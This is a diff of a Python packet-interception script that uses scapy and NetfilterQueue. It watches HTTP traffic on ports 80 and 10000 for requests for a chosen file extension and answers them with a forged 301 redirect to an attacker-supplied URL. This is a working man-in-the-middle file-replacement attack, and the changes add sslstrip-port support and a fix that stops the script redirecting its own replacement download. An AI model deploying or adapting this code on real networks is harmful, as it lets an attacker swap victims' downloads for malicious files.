@@ -13,11 +13,12 @@ def get_args():
         "-e", "--extension", dest="extension", help="Specify a file extension"
     )
     parser.add_argument(
-        "-d", "--destination", dest="destination", help="Destination (sslstrip, forward, local)"
+        "-d",
+        "--destination",
+        dest="destination",
+        help="Destination (sslstrip, forward, local)",
     )
-    parser.add_argument(
-        "-l", "--link", dest="link", help="Specify a replace link"
-    )
+    parser.add_argument("-u", "--url", dest="url", help="Specify a replace url")
     values = parser.parse_args()
     if not values.extension:
         parser.error(
@@ -27,9 +28,9 @@ def get_args():
         parser.error(
             "[-] Please specify a destination (sslstrip, forward, local), use --help for more information"
         )
-    if not values.link:
+    if not values.url:
         parser.error(
-            "[-] Please specify a file extension, use --help for more information"
+            "[-] Please specify a replace url, use --help for more information"
         )
     return values
 
@@ -47,24 +48,37 @@ def forge_packet(packet, load):
 def process_packet(packet):
     # Convert the NetfilterQueue packet into a scapy packet.
     scapy_packet = scapy.IP(packet.get_payload())
+    print(scapy_packet.show())
     # HTTP data is placed in the Raw layer.
     if scapy_packet.haslayer(scapy.Raw):
         # tcp dport = destination (request)
-        if scapy_packet[scapy.TCP].dport == 80:
+        if (
+            scapy_packet[scapy.TCP].dport == 80
+            or scapy_packet[scapy.TCP].dport == 10000
+        ):
+            print(str(scapy_packet[scapy.Raw].load))
+            print(options.extension)
             # If target extension is in the load, wait for
             # the response to the package.
-            if options.extension in str(scapy_packet[scapy.Raw].load):
+            if options.extension in str(
+                scapy_packet[scapy.Raw].load
+            ) and options.url not in str(scapy_packet[scapy.Raw].load):
                 print("[+] {} request".format(options.extension))
                 ack_list.append(scapy_packet[scapy.TCP].ack)
         # tcp sport = source (response)
-        elif scapy_packet[scapy.TCP].sport == 80:
+        elif (
+            scapy_packet[scapy.TCP].sport == 80
+            or scapy_packet[scapy.TCP].sport == 10000
+        ):
             # If it is a response we have been waiting for
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing Files")
                 forged_packet = forge_packet(
                     scapy_packet,
-                    "HTTP/1.1 301 Moved Permanently\nLocation: {}\n\n".format(options.link)
+                    "HTTP/1.1 301 Moved Permanently\nLocation: {}\n\n".format(
+                        options.url
+                    ),
                 )
                 # Set the forged scapy packet payload to the
                 # NetfilterQueue packet.
